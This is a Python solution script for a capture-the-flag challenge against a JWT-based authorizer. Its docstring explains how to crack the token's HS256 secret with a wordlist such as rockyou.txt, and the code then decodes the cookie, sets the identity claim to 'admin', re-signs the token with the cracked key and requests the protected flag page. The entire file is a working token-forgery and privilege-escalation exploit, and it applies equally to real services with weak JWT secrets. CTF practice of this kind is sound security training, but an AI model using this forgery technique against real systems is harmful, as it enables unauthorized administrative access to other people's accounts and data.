"""Script to fetch the flag from the JWT token authorizer.

The main crux of the challenge is cracking the JWT secret.

Run as follows:

    poetry run main.py <url> -c > /tmp/jwt.cookie
    ./cookie_cracker /tmp/jwt.cookie <wordlist> // e.g., rockyou.txt
    poetry run main.py <url> -k <pass>
"""
import argparse
import json

from html.parser import HTMLParser

# third party libraries
import requests
import jwt


COOKIE_NAME = "access_token_cookie"


class HTMLFlagParser(HTMLParser):
    def handle_data(self, data: str) -> None:
        if "247CTF" in data:
            print(f"flag: {data}")


def parser() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Script to get Flag from Jwt token",
    )
    parser.add_argument("url", metavar="url", help="challenge url")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-k", "--key", metavar="key", help="jwt secret")
    group.add_argument(
        "-c",
        "--cookie",
        help="stop after fetching cookie (default: %(default)s)",
        action="store_true",
        default=False,
    )

    args = parser.parse_args()
    if not args.cookie and not args.key:
        parser.error("not enought arguments: need either -c/--cookie or -k/--key key")
    return args


def query(url: str, cookies: dict = {}) -> requests.models.Response:
    response = requests.get(url, cookies=cookies)
    response.raise_for_status()
    return response


def get_cookie(url: str, cookie_name: str) -> str:
    response = query(url)
    return response.cookies.get(cookie_name)


def print_flag(url: str, cookies: dict) -> None:
    response = query(url, cookies=cookies)
    parser = HTMLFlagParser()
    parser.feed(response.text)


def encode_jwt(payload: dict, key: str, algorithm: str = "HS256"):
    return jwt.encode(payload, key, algorithm)


def decode_jwt(token: str, key: str, algorithms: list[str] = ["HS256"], leeway: float = 100.0) -> dict:
    return jwt.decode(token, key, algorithms=algorithms, leeway=leeway)


def main(url: str, key: str, show_cookie: bool) -> None:
    cookie = get_cookie(url + "flag", COOKIE_NAME)
    if show_cookie:
        print(cookie)
        return
    print(f"Got cookie of length: {len(cookie)}")

    payload = decode_jwt(cookie, key)
    print("Jwt token payload: \n", json.dumps(payload, indent=4))

    payload["identity"] = "admin"

    new_payload = encode_jwt(payload, key)
    print_flag(url + "flag", cookies={COOKIE_NAME: new_payload})


if __name__ == "__main__":
    args = parser()
    main(args.url, args.key, args.cookie)
